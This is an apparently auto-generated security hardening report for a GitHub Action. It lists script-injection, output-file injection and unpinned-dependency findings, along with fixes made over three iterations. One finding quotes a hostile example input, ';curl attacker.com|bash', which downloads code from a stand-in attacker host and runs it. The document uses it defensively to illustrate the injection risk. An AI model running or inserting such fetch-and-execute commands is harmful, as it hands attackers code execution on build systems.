<!-- markdownlint-disable -->

# Hardening Report: asafamos--axle-action/v1.1.0

> This file was generated automatically by the hardening agent.

**Policy SHA:** `d636be7e43ef829af6e853da6b3c7566db9f72fe`

**Test Policy SHA:** `843adf9e4b8f85d0c08b27b9d0b09dd094b54702`

**Harden Agent Version:** `2`

Action **asafamos--axle-action/v1.1.0** was hardened automatically. 12 finding(s) were identified and resolved across 3 iteration(s).

## Findings Fixed

### script-injection (severity: high)

Sub-rule (a): Multiple `${{ inputs.* }}` and `${{ github.* }}` expressions are interpolated directly inside `run:` shell blocks, enabling script injection. In the 'Build + start host project' step, entire shell commands are injected verbatim: `${{ inputs.install-command }}`, `${{ inputs.build-command }}`, and `nohup ${{ inputs.start-command }}` are each expanded as raw shell lines — a caller can supply `;curl attacker.com|bash` as an input. `${{ inputs.wait-on-port }}` is also interpolated unquoted in a URL. In the 'Scan' step, `${{ inputs.url }}`, `${{ inputs.wait-on-port }}`, `${{ inputs.fail-on }}`, `${{ inputs.with-ai-fixes }}`, and `${{ inputs.max-ai-fixes }}` are all interpolated directly into the shell script. In the 'Resolve axle CLI package root' step, `${{ github.action_path }}` is interpolated directly. All of these must be moved to `env:` variables and referenced as quoted `"$VAR"` shell expansions.

Locations:

- `action.yml:74`
- `action.yml:91`
- `action.yml:92`
- `action.yml:93`
- `action.yml:95`
- `action.yml:103`
- `action.yml:105`
- `action.yml:108`
- `action.yml:109`
- `action.yml:110`

### github-env-injection (severity: high)

In the 'Resolve axle CLI package root' step, `${{ github.action_path }}` is written directly to `$GITHUB_OUTPUT` without the required sanitization step (`printf '%s' ... | tr -d '\n\r'`). The offending line is: `echo "dir=${{ github.action_path }}/cli" >> "$GITHUB_OUTPUT"`. Although `github.action_path` is typically controlled by GitHub, any `${{ ... }}` value written to a special environment file must be sanitized before the write to prevent newline injection that could add arbitrary entries to `GITHUB_OUTPUT`.

Locations:

- `action.yml:74`

### unpinned-uses (severity: high)

Four `uses:` references are pinned to mutable version tags rather than immutable 40-character SHA digests, making the action vulnerable to supply-chain attacks if those tags are moved or compromised: `actions/setup-node@v4` (line 68), `actions/cache@v4` (line 80), `actions/upload-artifact@v4` (line 122), `actions/github-script@v7` (line 129). Each should be replaced with the full commit SHA, e.g. `actions/setup-node@11bd71901bbe5b1630ceea73d27597364c9af683 # v4`.

Locations:

- `action.yml:68`
- `action.yml:80`
- `action.yml:122`
- `action.yml:129`

### static-inline-injection (severity: high)

shell injection: expression "${{ inputs.install-command }}" appears directly in run: block of step "Build + start host project (when url is empty)"; move to env: map

Locations:

- `action.yml:111`

### static-inline-injection (severity: high)

shell injection: expression "${{ inputs.build-command }}" appears directly in run: block of step "Build + start host project (when url is empty)"; move to env: map

Locations:

- `action.yml:112`

### static-inline-injection (severity: high)

shell injection: expression "${{ inputs.start-command }}" appears directly in run: block of step "Build + start host project (when url is empty)"; move to env: map

Locations:

- `action.yml:113`

### static-inline-injection (severity: high)

shell injection: expression "${{ inputs.wait-on-port }}" appears directly in run: block of step "Build + start host project (when url is empty)"; move to env: map

Locations:

- `action.yml:115`

### static-inline-injection (severity: high)

shell injection: expression "${{ inputs.url }}" appears directly in run: block of step "Scan"; move to env: map

Locations:

- `action.yml:125`

### static-inline-injection (severity: high)

shell injection: expression "${{ inputs.wait-on-port }}" appears directly in run: block of step "Scan"; move to env: map

Locations:

- `action.yml:127`

### static-inline-injection (severity: high)

shell injection: expression "${{ inputs.fail-on }}" appears directly in run: block of step "Scan"; move to env: map

Locations:

- `action.yml:131`

### static-inline-injection (severity: high)

shell injection: expression "${{ inputs.with-ai-fixes }}" appears directly in run: block of step "Scan"; move to env: map

Locations:

- `action.yml:132`

### static-inline-injection (severity: high)

shell injection: expression "${{ inputs.max-ai-fixes }}" appears directly in run: block of step "Scan"; move to env: map

Locations:

- `action.yml:133`

## Iteration Notes

### Iteration 1

**Fixes applied:** unpinned-uses, script-injection, github-env-injection, static-inline-injection

**Notes:**

Fixed all findings in hardened/action/action.yml:

1. unpinned-uses: Pinned all 4 actions to full SHA digests with tag comments:
   - actions/setup-node@49933ea5288caeca8642d1e84afbd3f7d6820020 # v4
   - actions/cache@0057852bfaa89a56745cba8c7296529d2fc39830 # v4
   - actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02 # v4
   - actions/github-script@f28e40c7f34bde8b3046d885e986cb6290c5673b # v7

2. script-injection / static-inline-injection: Moved all ${{ inputs.* }} and ${{ github.* }} expressions out of run: blocks into env: maps. 'Build + start host project' step uses INSTALL_COMMAND, BUILD_COMMAND, START_COMMAND, WAIT_ON_PORT env vars. 'Scan' step uses INPUT_URL, INPUT_WAIT_ON_PORT, INPUT_FAIL_ON, INPUT_WITH_AI_FIXES, INPUT_MAX_AI_FIXES env vars. 'Resolve axle CLI package root' step uses ACTION_PATH env var.

3. github-env-injection: The github.action_path value is now placed in ACTION_PATH env var and sanitized with 'printf "%s" "$ACTION_PATH" | tr -d "\n\r"' before being written to $GITHUB_OUTPUT.

### Iteration 2

**Fixes applied:** script-injection

**Notes:**

Fixed unquoted shell variable expansions in the 'Build + start host project' step of action.yml. Changed `$INSTALL_COMMAND`, `$BUILD_COMMAND`, and `nohup $START_COMMAND` to `"$INSTALL_COMMAND"`, `"$BUILD_COMMAND"`, and `nohup "$START_COMMAND"` respectively. This prevents shell metacharacter injection from user-supplied install-command, build-command, and start-command inputs.

### Iteration 3

**Fixes applied:** script-injection

**Notes:**

Fixed the 'Build + start host project' step in action.yml:
1. Added numeric validation for WAIT_ON_PORT (must be integer 1-65535) before using it in the wait-on URL argument, preventing shell injection via the port value.
2. Changed command execution from bare `"$INSTALL_COMMAND"`, `"$BUILD_COMMAND"`, `nohup "$START_COMMAND"` (which treated the env var as a single command name) to `bash -c "$INSTALL_COMMAND"`, `bash -c "$BUILD_COMMAND"`, `nohup bash -c "$START_COMMAND"` — properly executing them as shell commands while keeping all ${{ }} expressions in the env: block rather than interpolated into the run: script string.
The ${{ inputs.* }} expressions were already correctly placed in the env: block from a previous iteration; this iteration fixed the unsafe execution patterns within the run: block itself.

